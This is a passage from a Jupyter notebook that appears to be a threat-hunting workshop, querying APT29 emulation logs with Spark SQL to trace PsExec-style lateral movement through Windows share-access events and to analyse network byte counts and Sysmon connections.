    "    FROM apt29HostDay1 o\n",
    "    INNER JOIN (\n",
    "        SELECT Hostname, TargetUserName, TargetLogonId, IpAddress\n",
    "        FROM apt29HostDay1\n",
    "        WHERE LOWER(Channel) = 'security'\n",
    "            AND EventID = 4624\n",
    "            AND LogonType = 3\n",
    "            AND NOT IpAddress LIKE \"%-%\"\n",
    "            AND NOT TargetUserName LIKE \"%$\"          \n",
    "        ) a\n",
    "    ON o.SubjectLogonId = a.TargetLogonId\n",
    "    WHERE LOWER(o.Channel) = 'security'\n",
    "    ''')\n",
    "\n",
    "print(\"There are \", lateralMovement.count(), ' records.')\n",
    "lateralMovement.show(truncate = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Let's take a look at **Security 5145 (A network share object was checked)** event:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "There are  45  records.\n",
      "+---------------------+-------+---------------+--------------+----------+--------------+-----------------------------+--------------+-------------+---------+\n",
      "|Hostname             |EventID|SubjectUserName|SubjectLogonId|ShareName |ShareLocalPath|RelativeTargetName           |TargetUserName|TargetLogonId|IpAddress|\n",
      "+---------------------+-------+---------------+--------------+----------+--------------+-----------------------------+--------------+-------------+---------+\n",
      "|NEWYORK.dmevals.local|5145   |pbeesly        |0x5dd594      |\\\\*\\IPC$  |null          |samr                         |pbeesly       |0x5dd594     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x861a79      |\\\\*\\ADMIN$|\\??\\C:\\windows|Temp\\python.exe              |pbeesly       |0x861a79     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x861a79      |\\\\*\\ADMIN$|\\??\\C:\\windows|Temp                         |pbeesly       |0x861a79     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x861a79      |\\\\*\\ADMIN$|\\??\\C:\\windows|Temp\\python.exe              |pbeesly       |0x861a79     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x861a79      |\\\\*\\ADMIN$|\\??\\C:\\windows|Temp\\python.exe              |pbeesly       |0x861a79     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x866b2c      |\\\\*\\ADMIN$|\\??\\C:\\windows|\\                            |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x866b2c      |\\\\*\\ADMIN$|\\??\\C:\\windows|PSEXESVC.exe                 |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x866b2c      |\\\\*\\ADMIN$|\\??\\C:\\windows|PSEXESVC.exe                 |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x866b2c      |\\\\*\\IPC$  |null          |svcctl                       |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x866b2c      |\\\\*\\IPC$  |null          |PSEXESVC                     |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x866b2c      |\\\\*\\IPC$  |null          |PSEXESVC-SCRANTON-2668-stdin |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x866b2c      |\\\\*\\IPC$  |null          |PSEXESVC-SCRANTON-2668-stdout|pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x866b2c      |\\\\*\\IPC$  |null          |PSEXESVC-SCRANTON-2668-stderr|pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x866b2c      |\\\\*\\IPC$  |null          |svcctl                       |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x866b2c      |\\\\*\\ADMIN$|\\??\\C:\\windows|PSEXESVC.exe                 |pbeesly       |0x866b2c     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86a8df      |\\\\*\\ADMIN$|\\??\\C:\\windows|\\                            |pbeesly       |0x86a8df     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86a8df      |\\\\*\\ADMIN$|\\??\\C:\\windows|PSEXESVC.exe                 |pbeesly       |0x86a8df     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86a8df      |\\\\*\\ADMIN$|\\??\\C:\\windows|PSEXESVC.exe                 |pbeesly       |0x86a8df     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86a8df      |\\\\*\\IPC$  |null          |svcctl                       |pbeesly       |0x86a8df     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86a8df      |\\\\*\\IPC$  |null          |PSEXESVC                     |pbeesly       |0x86a8df     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86a8df      |\\\\*\\IPC$  |null          |PSEXESVC-SCRANTON-5924-stdin |pbeesly       |0x86a8df     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86a8df      |\\\\*\\IPC$  |null          |PSEXESVC-SCRANTON-5924-stdout|pbeesly       |0x86a8df     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86a8df      |\\\\*\\IPC$  |null          |PSEXESVC-SCRANTON-5924-stderr|pbeesly       |0x86a8df     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86a8df      |\\\\*\\IPC$  |null          |svcctl                       |pbeesly       |0x86a8df     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86a8df      |\\\\*\\ADMIN$|\\??\\C:\\windows|PSEXESVC.exe                 |pbeesly       |0x86a8df     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86d84f      |\\\\*\\ADMIN$|\\??\\C:\\windows|\\                            |pbeesly       |0x86d84f     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86d84f      |\\\\*\\ADMIN$|\\??\\C:\\windows|PSEXESVC.exe                 |pbeesly       |0x86d84f     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86d84f      |\\\\*\\ADMIN$|\\??\\C:\\windows|PSEXESVC.exe                 |pbeesly       |0x86d84f     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86d84f      |\\\\*\\IPC$  |null          |svcctl                       |pbeesly       |0x86d84f     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86d84f      |\\\\*\\IPC$  |null          |PSEXESVC                     |pbeesly       |0x86d84f     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86d84f      |\\\\*\\IPC$  |null          |PSEXESVC-SCRANTON-1412-stdin |pbeesly       |0x86d84f     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86d84f      |\\\\*\\IPC$  |null          |PSEXESVC-SCRANTON-1412-stdout|pbeesly       |0x86d84f     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86d84f      |\\\\*\\IPC$  |null          |PSEXESVC-SCRANTON-1412-stderr|pbeesly       |0x86d84f     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86d84f      |\\\\*\\IPC$  |null          |svcctl                       |pbeesly       |0x86d84f     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x86d84f      |\\\\*\\ADMIN$|\\??\\C:\\windows|PSEXESVC.exe                 |pbeesly       |0x86d84f     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x890aef      |\\\\*\\ADMIN$|\\??\\C:\\windows|\\                            |pbeesly       |0x890aef     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x890aef      |\\\\*\\ADMIN$|\\??\\C:\\windows|PSEXESVC.exe                 |pbeesly       |0x890aef     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x890aef      |\\\\*\\ADMIN$|\\??\\C:\\windows|PSEXESVC.exe                 |pbeesly       |0x890aef     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x890aef      |\\\\*\\IPC$  |null          |svcctl                       |pbeesly       |0x890aef     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x890aef      |\\\\*\\IPC$  |null          |PSEXESVC                     |pbeesly       |0x890aef     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x890aef      |\\\\*\\IPC$  |null          |PSEXESVC-SCRANTON-8928-stdin |pbeesly       |0x890aef     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x890aef      |\\\\*\\IPC$  |null          |PSEXESVC-SCRANTON-8928-stdout|pbeesly       |0x890aef     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x890aef      |\\\\*\\IPC$  |null          |PSEXESVC-SCRANTON-8928-stderr|pbeesly       |0x890aef     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x890aef      |\\\\*\\IPC$  |null          |svcctl                       |pbeesly       |0x890aef     |10.0.1.4 |\n",
      "|NASHUA.dmevals.local |5145   |pbeesly        |0x890aef      |\\\\*\\ADMIN$|\\??\\C:\\windows|PSEXESVC.exe                 |pbeesly       |0x890aef     |10.0.1.4 |\n",
      "+---------------------+-------+---------------+--------------+----------+--------------+-----------------------------+--------------+-------------+---------+\n",
      "\n"
     ]
    }
   ],
   "source": [
    "lateralMovement = spark.sql(\n",
    "    '''\n",
    "    SELECT\n",
    "        o.Hostname, o.EventID, o.SubjectUserName, o.SubjectLogonId, o.ShareName, o.ShareLocalPath, o.RelativeTargetName,\n",
    "        a.TargetUserName, a.TargetLogonId, a.IpAddress\n",
    "    FROM apt29HostDay1 o\n",
    "    INNER JOIN (\n",
    "        SELECT Hostname, TargetUserName, TargetLogonId, IpAddress\n",
    "        FROM apt29HostDay1\n",
    "        WHERE LOWER(Channel) = 'security'\n",
    "            AND EventID = 4624\n",
    "            AND LogonType = 3\n",
    "            AND NOT IpAddress LIKE \"%-%\"\n",
    "            AND NOT TargetUserName LIKE \"%$\"          \n",
    "        ) a\n",
    "    ON o.SubjectLogonId = a.TargetLogonId\n",
    "    WHERE LOWER(o.Channel) = 'security'\n",
    "        AND EventID = 5145\n",
    "    ''')\n",
    "\n",
    "print(\"There are \", lateralMovement.count(), ' records.')\n",
    "lateralMovement.show(45, truncate = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Now we have **more context** to add in our data model :D"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![](images/lateral3.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### f) Finally... let's check some network data!! :D"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "How many byters were transferred from hosts on days 1?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Summary of Descriptive Statistics -  orig_bytes\n",
      "**********************************************************\n",
      "Count of values          :  577\n",
      "Count of Null values     :  1563\n",
      "Central tendency:-----------------------------------------\n",
      "Mean(Average)            :  26483.55\n",
      "Median(Percentile 25)    :  997.0\n",
      "Min, Max, and Percentiles:--------------------------------\n",
      "Minimum                  :  0.0\n",
      "Maximum                  :  4261160.0\n",
      "Percentile 25 (Q1)       :  997.0\n",
      "Percentile 75 (Q3)       :  997.0\n",
      "Variation:------------------------------------------------\n",
      "Standard Deviation       :  270959.17\n",
      "Range                    :  4261160.0\n",
      "Interquartile Range (IQR):  0.0\n",
      "Shape:----------------------------------------------------\n",
      "Skewness                 :  14.2\n",
      "Kurtosis                 :  211.56\n",
      "**********************************************************\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Statistic</th>\n",
       "      <th>Values</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>count</td>\n",
       "      <td>5.770000e+02</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Count Null Values</td>\n",
       "      <td>1.563000e+03</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>mean</td>\n",
       "      <td>2.648355e+04</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>median</td>\n",
       "      <td>9.970000e+02</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>min</td>\n",
       "      <td>0.000000e+00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>max</td>\n",
       "      <td>4.261160e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>percentile25</td>\n",
       "      <td>9.970000e+02</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>percentile75</td>\n",
       "      <td>9.970000e+02</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>stddev</td>\n",
       "      <td>2.709592e+05</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>range</td>\n",
       "      <td>4.261160e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>IQR</td>\n",
       "      <td>0.000000e+00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>skewness</td>\n",
       "      <td>1.419589e+01</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>kurtosis</td>\n",
       "      <td>2.115600e+02</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "            Statistic        Values\n",
       "0               count  5.770000e+02\n",
       "1   Count Null Values  1.563000e+03\n",
       "2                mean  2.648355e+04\n",
       "3              median  9.970000e+02\n",
       "4                 min  0.000000e+00\n",
       "5                 max  4.261160e+06\n",
       "6        percentile25  9.970000e+02\n",
       "7        percentile75  9.970000e+02\n",
       "8              stddev  2.709592e+05\n",
       "9               range  4.261160e+06\n",
       "10                IQR  0.000000e+00\n",
       "11           skewness  1.419589e+01\n",
       "12           kurtosis  2.115600e+02"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bytes_from_host_day1 = spark.sql(\n",
    "    '''\n",
    "SELECT orig_bytes\n",
    "FROM apt29NetworkDay1\n",
    "                          ''')\n",
    "\n",
    "ds.numStats(bytes_from_host_day1,'orig_bytes')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Let's analyze the results in a more graphical way!! :)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.axes._subplots.AxesSubplot at 0x7f81f6314e50>"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "vis.histogram(bytes_from_host_day1.dropna(),'orig_bytes')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {
    "scrolled": false,
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.axes._subplots.AxesSubplot at 0x7f81f62e7a10>"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "vis.box_plot(bytes_from_host_day1.dropna(),'orig_bytes')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Yeah, you are right... We need to filter our data!! "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "bytes_from_host_day1 = spark.sql(\n",
    "    '''\n",
    "SELECT orig_bytes\n",
    "FROM apt29NetworkDay1\n",
    "WHERE orig_bytes <= 1500\n",
    "                          ''')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.axes._subplots.AxesSubplot at 0x7f81f621dc10>"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "vis.histogram(bytes_from_host_day1.dropna(),'orig_bytes')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.axes._subplots.AxesSubplot at 0x7f81f6120310>"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "vis.box_plot(bytes_from_host_day1.dropna(),'orig_bytes')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Let's take a look at the **atipic** values for **bytes transfered**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "67\n",
      "+---------+---------+-----------+---------+----------+\n",
      "|id_orig_h|id_orig_p|id_resp_h  |id_resp_p|orig_bytes|\n",
      "+---------+---------+-----------+---------+----------+\n",
      "|10.0.1.4 |60803.0  |10.0.1.6   |445.0    |4261160.0 |\n",
      "|10.0.1.4 |60803.0  |10.0.1.6   |445.0    |4261160.0 |\n",
      "|10.0.1.4 |60760.0  |192.168.0.4|80.0     |2181167.0 |\n",
      "|10.0.1.4 |60807.0  |10.0.1.6   |445.0    |527368.0  |\n",
      "|10.0.1.4 |60807.0  |10.0.1.6   |445.0    |527368.0  |\n",
      "|10.0.1.4 |60806.0  |10.0.1.6   |445.0    |527300.0  |\n",
      "|10.0.1.4 |60806.0  |10.0.1.6   |445.0    |527300.0  |\n",
      "|10.0.1.4 |60646.0  |192.168.0.5|443.0    |524399.0  |\n",
      "|10.0.1.4 |60853.0  |10.0.1.6   |445.0    |193919.0  |\n",
      "|10.0.1.4 |60853.0  |10.0.1.6   |445.0    |193919.0  |\n",
      "|10.0.1.4 |60811.0  |10.0.1.6   |445.0    |193627.0  |\n",
      "|10.0.1.4 |60824.0  |10.0.1.6   |445.0    |193627.0  |\n",
      "|10.0.1.4 |60824.0  |10.0.1.6   |445.0    |193627.0  |\n",
      "|10.0.1.4 |60811.0  |10.0.1.6   |445.0    |193627.0  |\n",
      "|10.0.1.4 |60597.0  |192.168.0.5|1234.0   |70042.0   |\n",
      "|10.0.1.4 |60771.0  |10.0.1.6   |5985.0   |24430.0   |\n",
      "|10.0.1.4 |60771.0  |10.0.1.6   |5985.0   |24430.0   |\n",
      "|10.0.1.4 |60784.0  |10.0.0.4   |445.0    |20849.0   |\n",
      "|10.0.1.6 |57026.0  |10.0.0.4   |445.0    |20809.0   |\n",
      "|10.0.1.4 |60774.0  |10.0.1.6   |5985.0   |16130.0   |\n",
      "+---------+---------+-----------+---------+----------+\n",
      "only showing top 20 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "bytes_from_host_day1 = spark.sql(\n",
    "    '''\n",
    "SELECT id_orig_h,id_orig_p,id_resp_h,id_resp_p, orig_bytes\n",
    "FROM apt29NetworkDay1\n",
    "WHERE (orig_bytes >= 1500 AND NOT orig_bytes LIKE 'NaN')\n",
    "\n",
    "ORDER BY orig_bytes DESC\n",
    "                          ''')\n",
    "print(bytes_from_host_day1.count())\n",
    "bytes_from_host_day1.show(truncate = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "How can we **correlate** **network** and **host** data?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "8\n",
      "+---------+--------------------------+---------------------------------------------------------+----------+---------------+\n",
      "|ProcessId|User                      |Image                                                    |SourcePort|DestinationPort|\n",
      "+---------+--------------------------+---------------------------------------------------------+----------+---------------+\n",
      "|3852     |DMEVALS\\pbeesly           |C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe|59941     |80             |\n",
      "|8984     |NT AUTHORITY\\LOCAL SERVICE|C:\\Windows\\System32\\svchost.exe                          |59942     |80             |\n",
      "|8984     |NT AUTHORITY\\LOCAL SERVICE|C:\\Windows\\System32\\svchost.exe                          |59943     |80             |\n",
      "|8984     |NT AUTHORITY\\LOCAL SERVICE|C:\\Windows\\System32\\svchost.exe                          |59964     |80             |\n",
      "|8984     |NT AUTHORITY\\LOCAL SERVICE|C:\\Windows\\System32\\svchost.exe                          |59965     |80             |\n",
      "|8984     |NT AUTHORITY\\LOCAL SERVICE|C:\\Windows\\System32\\svchost.exe                          |59966     |80             |\n",
      "|8784     |DMEVALS\\pbeesly           |C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe|49775     |443            |\n",
      "|8784     |DMEVALS\\pbeesly           |C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe|49777     |443            |\n",
      "+---------+--------------------------+---------------------------------------------------------+----------+---------------+\n",
      "\n"
     ]
    }
   ],
   "source": [
    "sysmon3_host_day1 = spark.sql(\n",
    "    '''\n",
    "SELECT ProcessId, User, Image, SourcePort, DestinationPort\n",
    "FROM apt29HostDay1\n",
    "WHERE Channel = 'Microsoft-Windows-Sysmon/Operational'\n",
    "    AND EventID = 3\n",
    "    AND SourceIp LIKE \"%10.0.1.4%\"\n",
    "    AND DestinationIp LIKE \"%192.168.0.4%\"\n",
    "                          ''')\n",
    "print(sysmon3_host_day1.count())\n",
    "sysmon3_host_day1.show(truncate = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "# Thank you !!!"
   ]
  }
 ],
 "metadata": {
  "celltoolbar": "Slideshow",
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
